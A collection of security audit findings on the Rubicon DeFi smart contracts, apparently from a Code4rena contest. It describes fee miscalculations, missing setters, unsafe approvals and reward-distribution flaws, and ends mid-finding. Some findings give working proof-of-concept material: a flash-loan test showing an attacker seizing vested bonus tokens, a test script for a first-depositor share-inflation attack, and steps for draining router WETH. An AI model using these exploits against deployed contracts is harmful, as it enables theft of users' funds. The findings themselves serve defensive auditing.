`assets > assetsReceived`, and the function will revert.  ## Recommended Mitigation Steps The amount of shares that `previewWithdraw` should return is: `convertToShares(assets.add(assets.mul(feeBPS).div((10000.sub(feeBPS))))` I prove this mathematically in [this](https://i.ibb.co/hX41vzV/c4wd.jpg) image.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L264   # Vulnerability details  There is no option to revoke strategist's privilege. As the strategist is a very strategic role which can effectively steal LP's funds, this is very dangerous.  ## Impact A rogue / compromised / cancelled strategist can not be revoked of permissions.  ## Proof of Concept There's a function to [approve](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L264) a strategist, but no option to revoke the access.  ## Recommended Mitigation Steps Add a function / change the function and allow setting strategist's access to false.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557   # Vulnerability details  ## Background  A transfer-on-fee token or a deflationary/rebasing token, causing the received amount to be less than the accounted amount. For instance, a deflationary tokens might charge a certain fee for every transfer() or transferFrom()  Rubicon Finance supports the trading of any ERC20 token, and anyone can liquidity pool for a new token. Thus, it is possible that such a transfer-on-fee token or a deflationary/rebasing token be used in the protocol.  Based on the source code and comment of `BathToken._deposit()`, it appears that the team is aware of this issue, and proactively implemented control (before & after balance checks) to deal with deflationary tokens.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557)  ```solidity function _deposit(uint256 assets, address receiver)     internal     returns (uint256 shares) {     uint256 _pool = underlyingBalance();     uint256 _before = underlyingToken.balanceOf(address(this));      // **Assume caller is depositor**     underlyingToken.transferFrom(msg.sender, address(this), assets);     uint256 _after = underlyingToken.balanceOf(address(this));     assets = _after.sub(_before); // Additional check for deflationary tokens      (totalSupply == 0) ? shares = assets : shares = (         assets.mul(totalSupply)     ).div(_pool);      // Send shares to designated target     _mint(receiver, shares);     ..SNIP.. } ```  However, such control was not consistently applied across the protocol, and might cause the internal accounting of the orderbook to be incorrect.  ## Proof-of-Concept  If the `pay_gem` token is an deflationary token, the `info.pay_amt` and the actual amount of `pay_gem` tokens received will not be in sync.   For instance, assume that  XYZ token is a deflation token that charges 10% fee for every transfer. If an `offer(100, XYZ, 100, DAI)` is executed, an order with 100 XYZ (pay) and 100 DAI (buy) will be added to the orderbook. However, the orderbook will only received 90 XYZ, thus only 90 XYZ is ecrowed in the orderbook. This discrepancy would break the internal accounting system of the order book.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L392](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L392)  ```solidity /// @notice Key function to make a new offer. Takes funds from the caller into market escrow. function offer(     uint256 pay_amt,     ERC20 pay_gem,     uint256 buy_amt,     ERC20 buy_gem ) public virtual can_offer synchronized returns (uint256 id) {     ..SNIP..     OfferInfo memory info;     info.pay_amt = pay_amt;     info.pay_gem = pay_gem;     info.buy_amt = buy_amt;     info.buy_gem = buy_gem;     info.owner = msg.sender;     info.timestamp = uint64(block.timestamp);     id = _next_id();     offers[id] = info;      require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));     ..SNIP.. } ```  ## Impact  The internal accounting system of the order book would be inaccurate or break, affecting the protocol operation.  ## Recommended Mitigation Steps  In the `offer` function, get the actual received amount by calculating the difference of token balance before and after the transfer, and set the `info.pay_amt` to the actual received amount.  Alternatively, the team might want to consider implementing whitelisting mechanism so that deflationary tokens will not be supported if the risk of allowing permissionless creation of pool with arbitrary token deems to be significant. A DAO may be formed in the future to manage the whitelisting.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87   # Vulnerability details  ## Background  BathBuddy is a Vesting Wallet that payout withdrawers any `bonusTokens` they may have accrued while staking in the Bath Token (e.g. network incentives/governance tokens).  BathBuddy Vesting Wallet releases a user their relative share of the pool’s total vested bonus token during the withdraw call on BathToken.sol. This vesting occurs linearly over Unix time.  It was observed that an attacker could steal almost all the `bonusTokens` in the BathBuddy Vesting Wallet.  ## Proof-of-Concept  The root cause of this issue is that the amount of `bonusTokens` that a user is entitled to is based on their relative share of the pool’s total vested bonus token at the point of the withdraw call. It is calculated based on the user's "spot" share in the pool. Thus, it is possible for an attacker to deposit large amount of tokens into a BathToken Pool to gain significant share of the pool (e.g. 95%), and then withdraw the all the shares immediately. The withdraw call will trigger the `BathToken.distributeBonusTokenRewards`, and since attacker holds overwhelming amount of share in the pool, they will receive almost all the `bonusToken` in the BathBuddy Vesting wallet, leaving behind dust amount of `bonusToken` in the wallet. This could be perform in an atomic transaction and attacker can leverage on flash-loan to fund this attack.  The following shows an example of this issue:  1. A sponsor sent 1000 DAI to the BathBuddy Vesting Wallet to be used as `bonusTokens` for bathWETH pool. The vesting duration is 4 weeks. 2. Alice and Bob deposited 50 WETH and 50 WETH respectively. The total underlying asset of bathWETH is 100 WETH after depositing. Each of them hold 50% of the shares in the pool. 3. Fast forward to the last hour of the vesting period, most of the `bonusToken` have been vested and ready for the recipients to claim. In this example, estimate 998 DAI are ready to be claimed at the final hour. 4. Since Alice has 50% stake in the pool, she should have accured close to 449 DAI at this point. If she decided to withdraw all her bathWETH LP tokens at this point, she would receive close to 449 DAI as `bonusTokens`. But she choose not to withdraw yet. 5. Unfortunately, an attacker performed a flash-loan to borrow 8500 WETH, and deposit large amount of WETH into the bathWETH gain significant share of the pool, and then withdraw the all the shares immediately. 6. Since attacker hold the an overwhelming amount of shares in the pool, they will receive almost all the `bonusToken` (around 997 DAI) in the BathBuddy Vesting wallet, leaving behind dust amount of `bonusToken` in the wallet. 7. At this point, Alice decided to withdraw all her bathWETH LP token. She only received dust amount of 0.7 DAI as `bonusTokens`  The following code shows that the amount of `bonusTokens` a user is entitled is based on the user's current share in the pool - `amount = releasable * sharesWithdrawn/initialTotalSupply`.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L87)  ```solidity /// @inheritdoc IBathBuddy /// @dev Added and modified release function. Should be the only callable release function function release(     IERC20 token,     address recipient,     uint256 sharesWithdrawn,     uint256 initialTotalSupply,     uint256 poolFee ) external override {     require(         msg.sender == beneficiary,         "Caller is not the Bath Token beneficiary of these rewards"     );     uint256 releasable = vestedAmount(         address(token),         uint64(block.timestamp)     ) - released(address(token));     if (releasable > 0) {         uint256 amount = releasable.mul(sharesWithdrawn).div(             initialTotalSupply         );         uint256 _fee = amount.mul(poolFee).div(10000);          ..SNIP..          uint256 amountWithdrawn = amount.sub(_fee);         token.transfer(recipient, amountWithdrawn);          _erc20Released[address(token)] += amount;         ..SNIP..     } } ```  ## Test Scripts  Following is the test output that demostrate the above scenario:  ```javascript   Contract: Rubicon Exchange and Pools Original Tests     Deployment       ✓ is deployed (1783ms)     Bath House Initialization of Bath Pair and Bath Tokens       ✓ Bath House is deployed and initialized (66ms)         new bathWETH! 0x237eda6f0102c1684caEbA3Ebd89e26a79258C6f       ✓ WETH Bath Token for WETH asset is deployed and initialized (131ms)       ✓ Init BathBuddy Vesting Wallet and Add BathBuddy to WETH BathToken Pool (54ms)       ✓ Bath Pair is deployed and initialized w/ BathHouse (59ms)         undefined       ✓ Alice deposit 50 WETH to WETH bathTokens (137ms)         undefined       ✓ Bob deposit 50 WETH to WETH bathTokens (174ms) bathAssetInstance.bonusTokens.length = 1 bathBuddyInstance (Vesting Wallet) has 1000 DAI bathBuddyInstance.vestedAmount(DAI) = 0.000413359788359788 bathBuddyInstance.vestedAmount(DAI) = 500.000413359788359788 (End of 2nd week) bathBuddyInstance.vestedAmount(DAI) = 998.512318121693121693 (Last hour of the vesting period) 0 DAI has been released from BathBuddy Vesting Wallet Charles has 8500 bathWETH token, 0 DAI, 0 WETH Charles withdraw all his bathWETH tokens 997.338978147402060445 DAI has been released from BathBuddy Vesting Wallet Charles has 0 bathWETH token, 997.039776453957839827 DAI, 8497.45 WETH Alice has 5 bathWETH token, 0 DAI, 0 WETH 998.075233164534207763 DAI has been released from BathBuddy Vesting Wallet Alice has 0 bathWETH token, 0.736034140627007674 DAI, 6.2731175 WETH       ✓ Add Rewards (100 DAI) to BathBuddy Vesting Wallet  (749ms) bathAssetInstance: underlyingBalance() = 6.2768825 WETH, balanceOf = 6.2768825 WETH, Outstanding Amount = 0 WETH       ✓ [Debug] ```  Attacker Charles deposited 8500 WETH to the pool and withdraw them immediately at the final hour, and obtained almost all of the `bonusTokens` (997 DAI). When Alice withdraw from the pool, she only received 0.7 DAI as `bonusTokens`.  Script can be found [https://gist.github.com/xiaoming9090/2252f6b6f7e62fca20ecfbaac6f754f5](https://gist.github.com/xiaoming9090/2252f6b6f7e62fca20ecfbaac6f754f5)  Note: Due to some unknown issue with the testing environment, please create a new `BathBuddy.released2` functions to fetch the amount of token already released.  ## Impact  Loss of Fund for the users. BathToken LPs not able to receive the accured `bonusToken` that they are entitled to.  ## Recommended Mitigation Steps  Update the reward mechanism to ensure that the `bonusTokens` are distribute fairly and rewards of each user are accured correctly.  In the above example, since Alice hold 50% of the shares in the pool throughout the majority of the reward period, she should be entitled to close to 50% to the rewards/bonus. Anyone who join the pool at the last hour of the reward period should only be entitled dust amount of `bonusToken`.  Additionally, "spot" (or current) share of the pool should not be used to determine the amount of `bonusToken` a user is entitled to as it is vulnerable to pool/share manipulation or flash-loan attack. Checkpointing mechanism should be implemented so that at the minimum, the user's amount of share in the previous block is used for determining the rewards. This make flash-loan attack infeasible as such attack has to happen within the same block/transaction.  For distributing bonus/rewards, I would suggest checking out a widely referenced [Synthetix's Reward](https://github.com/Synthetixio/synthetix/blob/develop/contracts/StakingRewards.sol) Contract as I think that it would be more relevant than OZ's Vesting Wallet for this particular purpose.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629   # Vulnerability details  ## Background  BathBuddy is a Vesting Wallet that payout withdrawers any `bonusTokens` they may have accrued while staking in the Bath Token (e.g. network incentives/governance tokens).  BathBuddy Vesting Wallet releases a user their relative share of the pool’s total vested bonus token during the withdraw call on BathToken.sol. This vesting occurs linearly over Unix time.  It was observed that the BathToken LPs are unable to receive any bonus tokens from the BathBuddy Vesting Wallet during withdraw and the bonus tokens are struck in the BathBuddy Vesting Wallet.  ## Proof-of-Concept  The following shows that the address of the BathBuddy Vesting Wallet is stored in the `rewardsVestingWallet` state variable and it is used to call the `release` function to distribute bonus to the BathToken withdrawers.  [https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629)  ```solidity function distributeBonusTokenRewards(     address receiver,     uint256 sharesWithdrawn,     uint256 initialTotalSupply ) internal {     if (bonusTokens.length > 0) {         for (uint256 index = 0; index < bonusTokens.length; index++) {             IERC20 token = IERC20(bonusTokens[index]);             // Note: Shares already burned in Bath Token _withdraw              // Pair each bonus token with a lightly adapted OZ Vesting wallet. Each time a user withdraws, they             //  are released their relative share of this pool, of vested BathBuddy rewards             // The BathBuddy pool should accrue ERC-20 rewards just like OZ VestingWallet and simply just release the withdrawer's relative share of releaseable() tokens             if (rewardsVestingWallet != IBathBuddy(0)) {                 rewardsVestingWallet.release(                     (token),                     receiver,                     sharesWithdrawn,                     initialTotalSupply,                     feeBPS                 );             }         }     } } ```  However, there is no setter method to initialise the value of the `rewardsVestingWallet` state variable in the contracts. Therefore, the value of `rewardsVestingWallet` will always be zero. Note that Solidity only create a default getter for public state variable, but does not create a default setter.  Since `rewardsVestingWallet` is always zero, the condition `if (rewardsVestingWallet != IBathBuddy(0))` will always be evaluated as `false`. Thus, the code block `rewardsVestingWallet.release` will never be reached.  ## Impact  Loss of Fund for the users. BathToken LPs are not able to receive their `bonusToken`.  ## Recommended Mitigation Steps  Implement a setter method for the `rewardsVestingWallet` state variable in the contracts so that it can be initialised with BathBuddy Vesting Wallet address.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L229:#L244   # Vulnerability details  When swapping amongst multiple pairs in RubiconRouter's `_swap`, the fee is wrongly accounted for.  ## Impact Not all of the user's funds would be forwarded to RubinconMarket, therefore the user would lose funds.  ## Proof of Concept The `_swap` function is calculating the pay amount to send to RubiconMarket.sellAllAmount [to be](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L232): ``` currentAmount.sub(currentAmount.mul(expectedMarketFeeBPS).div(10000) ``` But this would lead to not all of the funds being pulled by RubiconMarket. I mathematically show this in [this image](https://i.ibb.co/J5678C3/c4amountlost.jpg). The correct parameter that needs to be sent to sellAllAmount is: ``` currentAmount.sub(currentAmount.mul(expectedMarketFeeBPS).div(10000+expectedMarketFeeBPS) ``` I mathematically prove this in [this image](https://i.ibb.co/xHzYfzF/c4newparam.jpg).  ## Recommended Mitigation Steps Change the parameter to the abovementioned one.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L180 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L157 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L256   # Vulnerability details  When using the approval mechanism in USDT, the approval must be set to 0 before it is updated. In Rubicon, when creating a pair, the paired asset's approval is not set to 0 before it is updated.  ## Impact Can't create pairs with USDT, the most popular stablecoin, as as the approval will revert.  ## Proof of Concept [USDT](https://etherscan.io/address/0xdac17f958d2ee523a2206206994597c13d831ec7#code) reverts on approval if previous allowance is not 0: ``` require(!((_value != 0) && (allowed[msg.sender][_spender] != 0))); ``` When creating a pair, Rubicon [approves](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathHouse.sol#L180) the paired asset without first setting it to 0: ``` desiredPairedAsset.approve(pairedPool, initialLiquidityExistingBathToken); ``` Therefore, if desiredPairedAsset is USDT, the function will revert, and pairs with USDT can not be created.  This problem will also manifest in RubiconMarket's [approval function](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L157) and BathToken's [approval function](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L256),   ## Recommended Mitigation Steps Set the allowance to 0 before setting it to the new value.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L356 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L374 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L434 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L451 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L491 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L548   # Vulnerability details  ## Impact When transferring ETH, use `call()` instead of `transfer()`.  The `transfer()` function only allows the recipient to use 2300 gas. If the recipient uses more than that, transfers will fail. In the future gas costs might change increasing the likelihood of that happening.  Keep in mind that `call()` introduces the risk of reentrancy. But, as long as the router follows the checks effects interactions pattern it should be fine. It's not supposed to hold any tokens anyway.  ## Proof of Concept See the linked code snippets above.  ## Tools Used none  ## Recommended Mitigation Steps Replace `transfer()` calls with `call()`. Keep in mind to check whether the call was successful by validating the return value:  ```sol (bool success, ) = msg.sender.call{value: amount}(""); require(success, "Transfer failed.") ```  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/peripheral_contracts/BathBuddy.sol#L69   # Vulnerability details  ## Impact The BathBuddy contract is able to receive ETH. But, there's no way of ever retrieving that ETH from the contract. The funds will be locked up.  Currently, there seems to be no logic in the protocol where ETH is sent to the contract. But, it might happen in the future. So I'd say it's a MED issue.  ## Proof of Concept `receive()`  function: https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/peripheral_contracts/BathBuddy.sol#L69  ## Tools Used none  ## Recommended Mitigation Steps Remove the `receive()` function if the contract isn't supposed to handle ETH. Otherwise, add the necessary logic to release the ETH it gets.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L448-L449 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L525-L535   # Vulnerability details  ## Impact  For upgradeable contracts, there must be storage gap to "allow developers to freely add new state variables in the future without compromising the storage compatibility with existing deployments". Otherwise it may be very difficult to write new implementation code. Without storage gap, the variable in child contract might be overwritten by the upgraded base contract if new variables are added to the base contract. This could have unintended and very serious consequences to the child contracts.  Refer to the bottom part of this article: https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable  ## Proof of Concept  As an example, the `ExpiringMarket` contract inherits `SimpleMarket`, and the `SimpleMarket` contract does not contain any storage gap. If in a future upgrade, an additional variable is added to the `SimpleMarket` contract, that new variable will overwrite the storage slot of the `stopped` variable in the `ExpiringMarket` contract, causing unintended consequences.   https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L448-L449  Similarly, the `ExpiringMarket` does not contain any storage gap either, and the `RubiconMarket` contract inherits `ExpiringMarket`. If a new variable is added to the `ExpiringMarket` contract in an upgrade, that variable will overwrite the `buyEnabled` variable in `ExpiringMarket` contract.   ## Tools Used  Manual review  ## Recommended Mitigation Steps  Recommend adding appropriate storage gap at the end of upgradeable contracts such as the below. Please reference OpenZeppelin upgradeable contract templates.  ```solidity uint256[50] private __gap; ```  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/521d50b22b41b1f52ff9a67ea68ed8012c618da9/contracts/rubiconPools/BathToken.sol#L199-L210   # Vulnerability details  ## Impact The `DOMAIN_SEPARATOR` is wrong calculated.  ## Proof of Concept  In the `initialize` method of the `BathToken` contract, the `name` of the contract is used to calculate the `DOMAIN_SEPARATOR`, however said name is set later, so it will use an incorrect `name`, making it impossible to calculate the `DOMAIN_SEPARATOR` correctly.  ```javascript DOMAIN_SEPARATOR = keccak256(     abi.encode(         keccak256(             "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"         ),         keccak256(bytes(name)),         keccak256(bytes("1")),         chainId,         address(this)     ) ); name = string(abi.encodePacked(_symbol, (" v1"))); ```  Affected source code: - [BathToken.sol#L199-L210](https://github.com/code-423n4/2022-05-rubicon/blob/521d50b22b41b1f52ff9a67ea68ed8012c618da9/contracts/rubiconPools/BathToken.sol#L199-L210)  ## Recommended Mitigation Steps - Set the `name` before use it.  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L383-L409   # Vulnerability details  ## Impact When a user creates an offer through the offerWithETH function of the RubiconRouter contract, the offer function of the RubiconMarket contract is called, and the RubiconRouter contract address is set to offer.owner in the offer function. This means that anyone can call the cancelForETH function of the RubiconRouter contract to cancel the offer and get the ether. ## Proof of Concept https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L383-L409 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L440-L452 ## Tools Used None ## Recommended Mitigation Steps Set the owner of offer_id to msg.sender in offerWithETH function and check it in cancelForETH function  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L325-L339   # Vulnerability details  ## Impact In  swapWithETH/buyAllAmountWithETH/offerWithETH/depositWithETH functions of the RubiconRouter contract, when msg.value > max_fill_withFee/pay_amt/amount/amtWithFee, the excess ether will not be returned to the user.  ## Proof of Concept https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L325-L339 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L383-L393 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L455-L462 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L494-L507 ## Tools Used None ## Recommended Mitigation Steps Return excess ether to msg.sender, or require msg.value == max_fill_withFee/pay_amt/amount/amtWithFee  
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L270 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L98-L101   # Vulnerability details   The function setBonusToken allows the same BonusToken to be added more than once to the array bonusTokens.  ```   function setBonusToken(address newBonusERC20) external onlyBathHouse {     bonusTokens.push(newBonusERC20);   } ```  ## Impact If that happens, early withdrawers can get Bonus in multiples of what they actually have right to. Late withdrawers, might not get any Bonus due to shortage.  ## Proof of Concept BathToken.sol, function setBonusToken https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L270-L272 1. function setBonusToken allows the same BonusToken to be added more than once to the array.  BathToken.sol, function distributeBonusTokenRewards https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629 2. a. As and when distributeBonusTokenRewards is triggered during a withdraw call, the same bonusToken will be released more than once.  BathBuddy.sol, function release https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L98-L101 2. b. The release function is called.  ## Tools Used Manual review  ## Recommended Mitigation Steps   Add the required validations to avoid duplicate additions of bonus tokens.  ```   function setBonusToken(address newBonusERC20) external onlyBathHouse {     require(newBonusERC20 != address(0), "invalid_addr");     if (bonusTokens.length > 0) {       for (uint256 index = 0; index < bonusTokens.length; index++) {         require (token != newBonusERC20, "token already exists")       }     }     bonusTokens.push(newBonusERC20);   } ```   
# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L844 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L857 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L883 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L898 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L927 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L951   # Vulnerability details  ## RMT-02M: Multiple Unsafe Arithmetic Operations  | File | Lines | Type | | :- | :- | :- | | RubiconMarket.sol | [L844](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L844), [L857](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L857), [L883](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L883), [L898](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L898), [L927](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L927), [L951](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L951) | Mathematical Operations |  ### Description  The referenced lines all perform unsafe multiplications using the unitary denominations of either `1 ether` (`1e18`) or `10**9` (`1e9`), both of which can easily lead to overflows when used as a multiplier for large amounts of assets.  ### Impact  Purchasing and selling amounts will be improperly fulfilled as well as improperly tracked as "sold out" / "bought out".  ### Solution (Recommended Mitigation Steps)  We advise the codebase to make use of the `mul` operation exposed by the `DSMath` library already incorporated into the codebase to guarantee all operations are performed safely and cannot overflow.  ### PoC  Issue is deducible by inspecting the relevant lines referenced in the issue and making note of the raw multiplication (`*`) operations performed.  ### Tools  Manual inspection of the codebase.  
# Lines of code  https://github.com/RubiconDeFi/rubicon-protocol-v1/blob/master/contracts/rubiconPools/BathToken.sol#L569-L571   # Vulnerability details  ## Impact The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.  ## Proof of Concept In `BathToken.sol:569-571`, the allocation of shares is calculated as follows: ```js (totalSupply == 0) ? shares = assets : shares = (     assets.mul(totalSupply) ).div(_pool); ```  An early attacker can exploit this by: * Attacker calls `openBathTokenSpawnAndSignal()` with `initialLiquidityNew = 1`, creating a new bath token with `totalSupply = 1` * Attacker transfers a large amount of underlying tokens to the bath token contract, such as `1000000` * Using `deposit()`, a victim deposits an amount less than `1000000`, such as `1000`:     * `assets = 1000`     * `(assets * totalSupply) / _pool = (1000 * 1) / 1000000 = 0.001`, which would round down to `0`     * Thus, the victim receives no shares in return for his deposit  To avoid minting 0 shares, subsequent depositors have to deposit equal to or more than the amount transferred by the attacker. Otherwise, their deposits accrue to the attacker who holds the only share.  ```js it("Victim receives 0 shares", async () => {     // 1. Attacker deposits 1 testCoin first when creating the liquidity pool     const initialLiquidityNew = 1;     const initialLiquidityExistingBathToken = ethers.utils.parseUnits("100", decimals);          // Approve DAI and testCoin for bathHouseInstance     await testCoin.approve(bathHouseInstance.address, initialLiquidityNew, {         from: attacker,     });     await DAIInstance.approve(         bathHouseInstance.address,         initialLiquidityExistingBathToken,         { from: attacker }     );      // Call open creation function, attacker deposits only 1 testCoin     const desiredPairedAsset = await DAIInstance.address;     await bathHouseInstance.openBathTokenSpawnAndSignal(         await testCoin.address,         initialLiquidityNew,         desiredPairedAsset,         initialLiquidityExistingBathToken,         { from: attacker }     );          // Retrieve resulting bathToken address     const newbathTokenAddress = await bathHouseInstance.getBathTokenfromAsset(testCoin.address);     const _newBathToken = await BathToken.at(newbathTokenAddress);      // 2. Attacker deposits large amount of testCoin into liquidity pool     let attackerAmt = ethers.utils.parseUnits("1000000", decimals);     await testCoin.approve(newbathTokenAddress, attackerAmt, {from: attacker});     await testCoin.transfer(newbathTokenAddress, attackerAmt, {from: attacker});      // 3. Victim deposits a smaller amount of testCoin, receives 0 shares     // In this case, we use (1 million - 1) testCoin     let victimAmt = ethers.utils.parseUnits("999999", decimals);     await testCoin.approve(newbathTokenAddress, victimAmt, {from: victim});     await _newBathToken.deposit(victimAmt, victim, {from: victim});          assert.equal(await _newBathToken.balanceOf(victim), 0); }); ```  ## Recommended Mitigation Steps * [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution. * In `_deposit()`, ensure the number of shares to be minted is non-zero:   `require(shares != 0, "No shares minted");`    
# Lines of code  [RubiconRouter.sol#L475-L492](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L475-L492)   # Vulnerability details  ## Impact  In the ```withdrawForETH``` function in ```RubiconRouter.sol```, the ```targetPool``` may be any contract that implements the ```IBathToken``` interface and returns ```wethAddress``` as its underlying token. The ```withdrawnWETH``` amount could be set to the ```RubiconRouter.sol``` contract's WETH balance so that the contract's entire WETH balance is withdrawn, as long as the ```tagetPool``` does not transfer any WETH to ```RubiconRouter.sol```. The caller of the ```withdrawForETH``` function would then receive the withdraw amount.  ## Proof of Concept  ```     function withdrawForETH(uint256 shares, address targetPool)         external         payable         returns (uint256 withdrawnWETH)     {         IERC20 target = IBathToken(targetPool).underlyingToken();         require(target == ERC20(wethAddress), "target pool not weth pool");         require(             IBathToken(targetPool).balanceOf(msg.sender) >= shares,             "don't own enough shares"         );         IBathToken(targetPool).transferFrom(msg.sender, address(this), shares);         withdrawnWETH = IBathToken(targetPool).withdraw(shares);         WETH9(wethAddress).withdraw(withdrawnWETH);          //Send back withdrawn native eth to sender         msg.sender.transfer(withdrawnWETH);     } ```  1. Let ```shares``` be equal to the contracts WETH balance.  2. The malicious ```targetPool``` contract returns the ```wethAddress``` as the underlying token on [line 480](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L480).   3. ```targetPool``` returns the max uint256 value for its balanceOf function to pass the require condition on [line 483](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L483) for any value of shares.  4. The transferFrom on 